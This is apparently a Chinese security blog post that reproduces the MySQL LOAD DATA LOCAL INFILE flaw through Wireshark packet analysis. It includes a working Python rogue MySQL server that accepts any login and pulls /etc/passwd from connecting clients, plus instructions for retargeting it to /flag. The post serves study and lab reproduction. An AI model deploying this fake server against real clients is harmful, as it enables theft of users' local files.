#  Mysql LOAD DATA 读取客户端任意文件   
twe1v3  蚁景网络安全   2025-02-11 09:30  
  
![](https://mmbiz.qpic.cn/mmbiz_gif/5znJiaZxqldyq3SBEPw0n6hCXNk6PmR3gyPFJDUCibH91GiaAHHKiaCpcsfnQJ2oImQunzubgDtpxzxNHONU88CypA/640?wx_fmt=gif&from=appmsg "")  
  
复现 Mysql LOAD DATA INFILE 读取客户端任意文件漏洞  
### 前言  
  
MySQL 客户端和服务端通信过程中是通过对话的形式来实现的，客户端发送一个操作请求，然后服务端根据客户端发送的请求来响应客户端，在这个过程中客户端如果一个操作需要两步才能完成，那么当它发送完第一个请求过后并不会存储这个请求，而是直接丢弃，所以第二步就是根据服务端的响应来继续进行，这里服务端就可以欺骗客户端做一些事情。  
  
但是一般的通信都是客户端发送一个 MySQL 语句然后服务器端根据这条语句查询后返回结果，也没什么可以利用的。但是 MySQL 有个语法   
LOAD DATA INFILE 可以用来读取一个文件的内容并插入到表中。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2NKeqV0qK9wna2VEjCR5LLYHXsAo3icrdH9ia1rRDexLcIYr9A8FdyXKg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
从上图的官方文档说明可以看到，该命令既可以读取服务端的文件，也可以读取客户端的文件，这取决于 LOCAL modifier 是否给定。  
  
读取服务端上的文件内容存入表中的 SQL 语句是：  
```
load data infile "/etc/passwd" into table TestTable fields terminated by '分隔符';
```  
  
读取客户端上的文件内容存入表中的 SQL 语句是：  
```
load data local infile "/etc/passwd" into table TestTable fields terminated by '分隔符';
```  
  
两相对比，读取客户端上的文件内容多了一个 local 关键字。  
  
以上所描述的过程可以形象地用两个人的对话来表示：  
1. 1. 客户端：把我本地 /data/test.csv 的内容插入到 TestTable 表中去  
  
1. 2. 服务端：请把你本地 /data/test.csv 的内容发送给我  
  
1. 3. 客户端：好的，这是我本地 /data/test.cvs 的内容  
  
1. 4. 服务端：成功/失败  
  
正常情况下这个流程没有问题，但是前文提到了客户端在第二次并不知道它自己前面发送了什么给服务器，所以客户端第二次要发送什么文件完全取决于服务端，如果这个服务端不正常，就有可能发生如下对话：  
1. 1. 客户端：请把我本地 /data/test.csv 的内容插入到 TestTable 表中去  
  
1. 2. 服务器：请把你本地 /etc/passwd 的内容发送给我  
  
1. 3. 客户端：好的，这是我本地 /etc/passwd 的内容  
  
1. 4. 服务端：成功偷取文件内容  
  
这样服务端就非法拿到了 /etc/passwd 的文件内容！接下来开始进行这个实验，做一个恶意服务端来欺骗客户端。为了编写出伪造恶意 MySQL 服务器的 POC，必须对 MySQL 协议有足够的了解，所以接下来尝试分析一下 MySQL 协议的数据包。  
### MySQL 协议数据包分析  
  
为了非法读取客户端文件，我们需要实现一个假的 MySQL 服务器。那如何实现呢？这需要我们对 MySQL 协议展开详细的分析才能做到，好在借助 Wireshark 结合 MySQL 官方文档可以帮助我们轻松分析 MySQL 协议的数据包。  
  
我以 ubuntu 虚拟机为客户端，windows物理机为服务端，借助 Wireshark 工具捕捉两者间的 mysql 通信数据包。  
  
客户端ip：192.168.239.129  
  
服务端ip：192.168.1.3  
  
客户端和服务端之间交互的 MySQL命令如下  
```
mysql -h 192.168.1.3 -P 3306 -u root -p
use security;
load data local infile "/etc/passwd" into table users;
```  
  
开启物理机的 mysql，这里注意需要设置 mysql 允许外来连接，不知道如何操作看看这篇文章  
  
设置 MySQL 允许外部访问  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r20pdBkjV0K8GCImic8rEmYsxUNvhDFJRxcpFbOTOSI8QyhbNSerQYVUg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
2.打开 wireshark，选择捕获 Vmware 相关的网卡并选择过滤 MySQL 协议，然后用虚拟机连接。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2OiaP3FNPqK9sW2MgRcpT3OFcafL5YTYRLNCoMYz45T5pcRXpGriaTnHg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
> 注意：不要使用 mysql 8.0.12 版本，否则相关的数据包显示不完整，甚至连接的用户名都显示不了，这个版本的加密可能更严格吧。  
  
  
官方文档告诉我们 MySQL 协议也支持通过 TLS 进行加密和身份验证。  
MYSQL_TLS  
  
那我们捕获的数据包是否进行了加密呢？稍加分析一下这些捕获的数据包就可以判断其确实使用了 TLS 进行了加密。接下来我们根据文档结合 Wireshark 捕获的数据包来进行实践论证！  
#### 连接过程数据包  
  
运行连接命令时捕获到的数据包  
```
mysql -h 192.168.1.3 -P 3306 -u root -p
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2nArsIs7xb8e5kUbXVdNdcnBMeQFnolKpHPQazV2YJyJlbdD0uO0ckg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
不打算全部都细说，就以前两个数据包为例子，和官方文档对照来学习其结构。  
- •  
#### 第一个数据包 Protocol::HandshakeV10 服务端到客户端  
  
当客户端通过 MySQL 协议连接到 服务端会发生什么呢？官方文档   
Protocol::Handshake 告诉我们当客户端连接到服务端时，服务端会发送一个初始的握手数据包（Initial Handshake Packet）给客户端。根据服务端的版本和配置选项，服务端会发送不同的初始数据包。  
  
为了服务端可以支持新的协议，Initial Handshake Packet 初始的握手数据包的第一个字节被定义为协议的版本号。从 MySQL 3.21.0 版本开始，发送的是   
Protocol::HandshakeV10  
  
我采用的 MySQL 版本是 5.7.26，所以发送的就是 Protocol::HandShakeV10 ，我们可以看看文档是如何定义这个数据包的结构的：  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2W7E6RhVicsic657VXo4ATTMzHlVyaFsJbTVXqsEygUmRBiaWrt2WJkFqA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
关于 Type 字段各个值的含义在   
Integer Types 和   
String Types  
  
int<1> 就是 一个字节，string<NUL> 表示以 00 字节结尾的字符串。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2nBwY37ScaLLYC37tm6o7SU7RUr5xG6qC7etWmcbpKWLl1icp16gicW2Q/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2D38Tozee4rMRmQrXSc3215S3yzxDRic6xdMOA2IbB4ooJWicmklzaxFA/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
我们点开 Wireshark 中服务端给客户端发送的初始数据包，从 Server Greeting 字段开始就是 payload 部分，也就是初始的握手数据包。从图中我们可以看到有协议版本、服务端的 MySQL 版本、进程 ID。这和我们上图的文档是不是完美对应上了？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2OpXmx2KapYTYtlaOWN5FYAiaSr2UzFY1nBBU1a8CHxUBgVWpbB4Pj0w/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
Protocol::HandShakeV10 只定义了一个数据包的 payload 部分，而关于头部的定义在   
MySQL Packets  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2RLQiaLnep3UlyFRp2Qn7sMzgDZrznbxPelfPIsyCaPDa6P8gBgAuwjQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
和实际的数据包的对应：  
  
payload_length:  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2fIXjIH8zXv4yiapGOOXYapwx6ciaiaDaPpmyV2DcKt8JTVVibxjoiaYhbhg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
sequence_id:  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r23y9Cwo8KahUdNXoe9sLvqhbB86fGZQcFlb1v8kjcKUWg8IYyjKMiaZg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
payload:  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2nsw9lupJ1Y7qvPg56KOjzc0JCAXUgVPAS4oTcviaxXehrGKkjicymicjQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
值得注意的是 Wireshark 的数据是按照小端排列的，比如数据包长度 74 对应的字段数据是 4a 00 00。  
  
其余的字段就不再分析了，大同小异。紧接着简单看看客户端给服务端的回应吧。官方文档告诉我们，如果客户端支持 SSL(  
Capabilities Flags & CLIENT_SSL is on and the   
mysql_ssl_mode of the client is not SSL_MODE_DISABLED) ，那么一个短的被称为   
Protocol::SSLRequest: 的数据包会被发送，使得服务端建立一个 SSL layer 并等待来自客户端的下一个数据包。（这里你可能会感到混乱，前面不是说 TLS 吗，怎么现在变成了 SSL？其实 TLS 是升级版的 SSL，但是由于 SSL 这一术语更加常用，所以人们经常互换使用者两个术语。  
什么是 SSL、TLS、HTTPS）  
  
如果不支持，那么客户端会返回   
Protocol::HandshakeResponse: 。同时在任何时候，发生任何错误，客户端都会断开连接。  
- •  
#### 第二个数据包 Protocol::HandshakeResponse41 客户端到服务端  
  
根据前面的分析，这里客户端如果支持 SSL，那么会发送 Protocol::SSLRequest 数据包，否则就是Protocol::HandshakeResponse:。根据我的验证，应该发送的是   
Protocol::HandshakeResponse41  
> 感觉挺奇怪的，我觉得应该发送 SSLRequest 才是，但是其包结构却又对应不上。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2ib2aS45qHbydXtdgX0jWHibLhNL7Jrrf7S824aesU8halowqfLpP5bibw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2788w1M48JodtKcwbibPiaMrXia5MueXibEmn9kTg8Qhl6LjDuYHRMPp1tQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
client_flag（4字节），包括了扩展的 Client capabilities  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2S28JJLicwloCHOLQgacQ02QsxE0MSXNHXQy1L1xbHgSs0zFZeVZstQQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
image-20230110154523933  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2AQiaAftuth8twexRX3sIkJdqp8dcypJKYQDPQ3Wnj24WL5OsxKnslIQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
max_packet_size（4字节）  
  
0x01000000 = 16777216  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r26ojxxSueR9pwcnaGssB6Ij53S1TTTl14ARlDtqSbdGIQ4MvRDFnrGw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
character_set（1字节）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2icSwZfXknH1icYHDBcgJH8Xd4WGjQM7Efvwx8JPkvrV4Db6velkgqybg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
filler（23字节）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r23afdzNdFKcR1bloVMDYLic57FWs16gfISvOnib3mp4tNXYLzIn2wyEHQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
username（以 00 结尾的字符串）  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2zOGnZLWhVJ7sajJUWNVLMaoEZsAKq8iaAcickwftPBJoNUsoV6pVFr8g/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
auth_response  
  
文档中说这是一个条件选项，当前的数据包是满足这个条件的。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2VZqMxoh8wjdYq4wF9mibliaygtFuxey8ribhHFEgibeic7O98V2YDH89bOg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2WfrubOtrNAJyxYTLeH8rjcpdr0Y8KqwbdsZoKRS0AQg2ibOwAwzpiaBQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
根据文档对这个字段的释义，其是一个不透明的验证响应。没想到在实际数据包中是一个密码，经过了某个哈希算法。我没有去求证 MySQL 采用什么哈希算法，  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2174jZmSYV97u3Rwhjcu7m2XlicVpg0CCsIs8BLuPU6gMRtibPysM0ylw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
接下来就不继续分析，大同小异。  
  
这个数据包的重点在于能够表明客户端是否支持 LOAD DATA LOCAL，这是我们可以读取客户端本地文件的根本。关于这个字段的定义在：  
CLIENT_LOCAL_FILES  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r21QQVicJ3zNuZhSMnKYjJeysbqkyUcjicy8hPphFpImEq4QUCK3X2Hltg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2AkI4wjVrichzCYbpNlfhMGo5hUBdaEmTSvFoYy65g7UqEG3EOFSaoXw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
- •  
#### 第三个数据包 Ok_Packet 服务端到客户端  
  
这个数据包一看就是   
Ok_Packet  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2KME3Kbl2JsLw36MU8ichuNjB81YauibianLbrJP21Qpic7CJ4D7vmBd61A/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
- •  
#### 第四个数据包 COM_QUERY 客户端到服务端  
  
这个数据包是   
COM_QUERY  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r21HykueZWdfLpF8ZHHnfBAgZ2ibAiaD6Ngw3zYNDTUm5Mo506WjnWd4Zw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
- •  
#### 第五个数据包 Text Resultset 服务端到客户端  
  
这个数据包是   
Text Resultset  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2icGuNSPAEEyFvguuP5icFugtf3yKWHratesoYkxYlldCkcMPISxQibzbg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2Yp2icXOicysqMPd01SwSB3WtglicuqEFmHQNSynMPd2iaibzUQo3GJibr5Lg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
#### 选择 security 数据库捕获的数据包  
  
当客户端向服务端发送 use security 命令选择数据库时捕获到的数据包。特别多，下图并没有截完整。这一步不重要  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2f26Esk2WYxxxVBWUtMzibG1gyP2wMuibrUUPu84icHiaEu1iaLoViaVg7fNg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
#### 读取客户端文件捕获的数据包  
  
在客户端上执行如下命令将 /etc/passwd 文件内容写入到 users 表时捕获到的数据包。  
```
load data local infile "/etc/passwd" into table users;
```  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2SV3NQfjo3ZNLQZSoypfPRicnNmdwtQ2Edn4gAScMpAxM6ZKrPKIRfNg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
一共就四个包，很明显第一个包是一个   
COM_QUERY  
> 这个图我不小心去读服务端的文件了，但是无伤大雅。数据包结构是一样的，而且下图我重抓啦~  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2DWgt9h2jGajEUzJA5GUhZog8wZ7Y8S9MVcJGVEIbOBKP9hiboYrB00A/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
糟糕的是第三个数据包由于我的物理机拒绝了访问而导致这个数据包是一个错误响应数据包。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2VsiaSQzAaL5T0lG1icrJPUTyZDq70nNiaa2CtSgSv20PMnzKA3iaQScCHQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
我在这里找到了解决方案  
  
stackoverflow  
  
连接的时候用  
```
mysql --local-infile=1 -u root -p -h 192.168.1.3
```  
  
重新抓一遍包！！  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2mKo3RPGGLEicQOE41SHPI5KquibjYzBHtf2WGf8lJrNOibqraYvvmR8Sg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
- •  
#### 第一个数据包 客户端到服务端 COM_QUERY  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2Czxgp80ovokVGVpmnbVqYSNdveyulXQOqnHSg5QUHqicvG2ypxJAEaw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
- •  
#### 第二个数据包 服务端到客户端 LOCAL INFILE Request  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2gtFBhuOEjfoMAWdOQtsYardEEDTJTFxwvHuLuQNBqicqhTnQm4ib7vuw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
这个数据包很重要，是构造恶意 MySQL 服务器的重点，我们需要根据这个数据包的结构书写 payload。具体地说，需要伪造的部分是 MySQL 数据包的首部和 payload 部分。还记得前面的 MySQL 数据包的结构图吗？  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r20ibu607CPur1Crj1hrb5hDyQWNF7EutIIO86Sia6IJONeFJ6ibrIU0gKw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
对照一下上图就会发现这个 MySQL 协议数据包的头部是  
  
0c 00 00 01  
  
对应的 payload（不是 wireshark 的那个 Payload） 是  
  
fb 2f 65 74 63 2f 70 61 73 73 77 64  
- •  
#### 第三个数据包 客户端到服务端 COM_QUERY  
  
上一个数据包服务端给客户端发送LOAL INFILE Request 的响应后，客户端发给服务端的这一个数据就包含了 /etc/passwd 文件的内容。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2zsnH9xLfbiaI2ZNhpVeBU3pr5ZUbt1ic1u6DJNkRbYNxqUDnw5Dx2LLw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
- •  
#### 第四个数据包 服务端到客户端 Ok_Packet  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2iaibFmibyC1KU04ickj8e7BTr86loOgSoU4Qsmiavx7Kjqlu4LsdM0iaiaYSw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
客户端经过两个请求，成功的将自己的 /etc/passwd 文件插入到表 users 中，  
  
根据我们前面所说，客户端在发送完第一个请求之后并不会存储这个请求，而是直接丢弃。所以第二步是根据服务端的响应来进行，这里服务器就可以欺骗客户端做一些事情（改变第二个数据包的响应内容）。有了以上的铺垫，POC 的编写并不困难。只需要完成连接过程，然后修改第二个数据包的响应内容就好。  
#### POC  
  
我懒得完整编写 POC 了，所以从网上抄了一个。值得一提的是这个 POC 并不标准，在连接建立过程中发送的数据并没有包含数据包首部，而发送 payload 的时候又包含了首部。（同时从编写的代码来看好像编写者并没有对数据包的构成有一个准确的认识 hhh，当然也有可能是我错了）  
1. 1. 客户端发送请求数据包  
  
1. 2. 服务端发送 Mysql 的 Greet 与 banner 信息  
  
1. 3. 客户端发送认证请求(用户名与密码)  
  
1. 4. 这里面我们当然要保证无论输入什么密码都是可以的  
  
1. 5. 获取到文件信息直接输出  
  
```
#!/usr/bin/python
#coding: utf8
import socket
# linux :
#filestring = "/etc/passwd"
# windows:
#filestring = "C:\Windows\system32\drivers\etc\hosts"
HOST = "0.0.0.0" # open for eeeeveryone! ^_^
PORT = 3306
BUFFER_SIZE = 1024
#1 Greeting
greeting = "\x5b\x00\x00\x00\x0a\x35\x2e\x36\x2e\x32\x38\x2d\x30\x75\x62\x75\x6e\x74\x75\x30\x2e\x31\x34\x2e\x30\x34\x2e\x31\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"
#2 Accept all authentications
authok = "\x07\x00\x00\x02\x00\x00\x00\x02\x00\x00\x00"
#3 Payload
#数据包长度
payloadlen = "\x0c" #这里明显有问题啦，因为文档告诉我们数据包的长度是用三个字节表示的
padding = "\x00\x00"
payload = payloadlen + padding +  "\x01\xfb\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64" #这里又把序列号拼在了 数据包的 payload部分
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind((HOST, PORT))
s.listen(1)
while True:
    conn, addr = s.accept()
    print 'Connection from:', addr
    conn.send(greeting)
    while True:
        data = conn.recv(BUFFER_SIZE)
        print " ".join("%02x" % ord(i) for i in data)
        conn.send(authok)
        data = conn.recv(BUFFER_SIZE)
        conn.send(payload)
        print "[*] Payload send!"
        data = conn.recv(BUFFER_SIZE)
        if not data: break
        print "Data received:", data
        break
    # Don't leave the connection open.
    conn.close()
```  
  
在服务器运行以上脚本，并在客户端连接  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r20OZnL9MpSmDX1ib2QKpxKllQF4mX8VvDX9ZGmkG0qAKFbS4QRNUlc6g/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
收到 /etc/passwd 文件内容  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2ic1ichialY1zS8HzX9PxiaAEWgQ0nM2clmVRibU4HWiaBDF7RicvxTgsGx0WQ/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
#### 读取 /flag  
  
如果想要读取 /flag 如何修改 payload 呢？这是一个很简单的问题，因为已知了这是一个   
LOCAL INFILE Request 数据包，所以只需要构造一下数据包首部和 payload 部分即可（保持 POC 中其余字段不变）。  
  
首部包括三个字节长的长度字段，一个字节长的序列号。  
  
payload 部分是一个字节长的包类型 0xFB 和 xx 字节长的文件名  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r29KzZF1DGicsoThic6zxsch5SmU8xW1C6YPKXNicAEWAHAleBuflep3Tkg/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
现在真正的数据部分是/flag，转换成十六进制为 2f666c6167，其拼接上一个字节的包类型 0xFB 就凑成了 payload 部分：fb 2f 66 6c 61 67 ，故首部中的长度字段值为 0x06。  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r26a7Xl6LeYGAljic97wElLiaHoxJibuHOv6hjug3U4leslnxZosIe5Hztw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2uiaic42MbhyiaHGpXB2jb1d5K0jicyHwLqvgLA6ITmGjl9RQelUgkDuDzw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/3RhuVysG9LfsxbbzX3kZvxCdHV6n61r2cwXiauyfFCd7UCKia7gb2lJqgUxmBMKzVYwbbpKJKqyeoRIF9CZON4Jw/640?wx_fmt=other&tp=webp&wxfrom=5&wx_lazy=1&wx_co=1 "null")  
#### 好用的自动化工具  
  
https://github.com/fnmsd/MySQL_Fake_Server  
### 参考链接  
  
MySQL服务端恶意读取客户端文件漏洞分析并使用Golang编写简易蜜罐  
  
Mysql LOAD DATA读取客户端任意文件漏洞复现(原理分析)  
  
https://blog.csdn.net/qq_53755216/article/details/118223185  
  
[](https://mp.weixin.qq.com/s?__biz=MzkxNTIwNTkyNg==&mid=2247549615&idx=1&sn=5de0fec4a85adc4c45c6864eec2c5c56&scene=21#wechat_redirect)  
  
